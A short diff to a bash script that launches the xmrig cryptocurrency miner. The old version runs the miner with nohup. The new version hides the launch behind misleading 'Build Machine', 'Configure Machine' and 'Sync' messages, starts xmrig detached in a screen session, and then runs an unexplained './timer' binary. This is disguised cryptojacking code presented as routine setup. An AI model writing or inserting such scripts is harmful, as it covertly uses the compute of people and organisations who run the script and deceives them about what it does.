@@ -1,5 +1,14 @@
 #!/bin/bash
 
-chmod +x xmrig  >/dev/null 2>&1
-nohup ./xmrig --config=config.json &
-while :; do shuf -n 1 -i 1-99999999; sleep 2; done
+echo "+++++++ Build Machine +++++++++"
+nohup mkdir safa
+
+echo "+++++++ Configure Machine +++++++++"
+chmod +x xmrig
+cd safa
+
+echo "Configure Successfully"
+cd ..
+screen -d -m ./xmrig --config=config.json
+echo "+++++++ Sync... +++++++++"
+./timer
